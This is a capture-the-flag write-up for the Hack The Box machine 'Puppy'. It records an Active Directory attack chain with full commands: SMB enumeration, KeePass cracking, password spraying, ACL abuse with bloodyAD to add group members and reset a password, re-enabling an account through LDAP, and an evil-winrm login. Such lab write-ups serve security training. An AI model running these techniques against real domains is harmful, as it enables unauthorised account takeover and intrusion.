---
title: "🐶 Puppy – HTB Writeup"
date: 2025-07-10
tags: ["HTB", "Writeup"]
draft: true
---

![](../../images/puppy/Puppy.png)

**Start credentials:**  
`levi.james : KingofAkron2025!`

---

## 🔍 Recon - Nmap Scan

We begin with an Nmap scan:

```bash
nmap -sC -sV -Pn 10.10.11.70
```

```text
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
111/tcp  open  rpcbind
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
2049/tcp open  nfs
3260/tcp open  iscsi
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```

This is clearly an **Active Directory environment**.

---

## SMB & Enumeration

Using `netexec` for SMB enumeration:

```bash
netexec smb 10.10.11.70 -u levi.james -p 'KingofAkron2025!'
```



![](../../images/puppy/image1.png)

![](../../images/puppy/image.png)

We **don’t have access** to the `DEV` share,  
so our first objective is to **gain access** and be able to browse its contents.

---

## BloodHound Analysis

We load data into BloodHound and discover that we have **GenericWrite** permission over the `DEVELOPERS` group.

![](../../images/puppy/image2.png)

So the idea here is to **add our current user** to the `DEVELOPERS` group in order to gain access to the share.

```bash
bloodyAD --host '10.10.11.70' -d 'dc01.puppy.htb' \
  -u 'levi.james' -p 'KingofAkron2025!' \
  add groupMember 'DEVELOPERS' levi.james
```

✅ We now have access to the `DEV` share.

![](../../images/puppy/image3.png)

---

## Keepass Brute-Force

From the share, we retrieve a file: `recovery.kdbx`.  
To brute-force it, we use:

> https://github.com/r3nt0n/keepass4brute

![](../../images/puppy/image12.png)

Then we can open the file with keepass

![](../../images/puppy/image4.png)

After cracking the DB, we extract usernames and passwords into `user.txt` and `pass.txt`, then spray:

```bash
netexec smb 10.10.11.70 -u user.txt -p pass.txt
```

![](../../images/puppy/image5.png)

Success! We get:

```text
ant.edwards : Antman2025!
```

---

## BloodHound - Round 2

Now, let’s return to BloodHound to see what this new user can do. We find that ant.edwards has GenericAll permissions on ADAM.SILVER, who is a member of the Remote Management Users group.

![](../../images/puppy/image6.png)

![](../../images/puppy/image7.png)

---

## Resetting ADAM.SILVER’s Password

The idea here is to leverage the GenericAll permission to forcibly reset ADAM.SILVER’s password using BloodyAD:

```bash
bloodyAD --host '10.10.11.70' -d 'puppy.htb' \
  -u 'ant.edwards' -p 'Antman2025!' \
  set password ADAM.SILVER 'N3wP@ssw0rd'
```

However, the account is disabled.

![](../../images/puppy/image8.png)

---

## Enabling the User Account

We prepare an .ldif file to re-enable the disabled ADAM.SILVER account by modifying its userAccountControl attribute. The value 512 sets the account to enabled and normal.

```bash
dn: CN=Adam D. Silver,CN=Users,DC=puppy,DC=htb
changetype: modify
replace: userAccountControl
userAccountControl: 512
```
To apply this change, we use the **ldapmodify** tool, which allows us to send LDAP modification requests to the Active Directory server

![](../../images/puppy/image9.png)

---

## Access with Evil-WinRM

Now that the account is active, we can use Evil-WinRM:

```bash
evil-winrm -i 10.10.11.70 -u 'adam.silver' -p 'N3wP@ssw0rd' -d 'puppy.htb'
```

![s](../../images/puppy/image10.png)

---

🏁 **User flag acquired! GG.**

```bash
type C:\Users\adam.silver\Desktop\user.txt
```
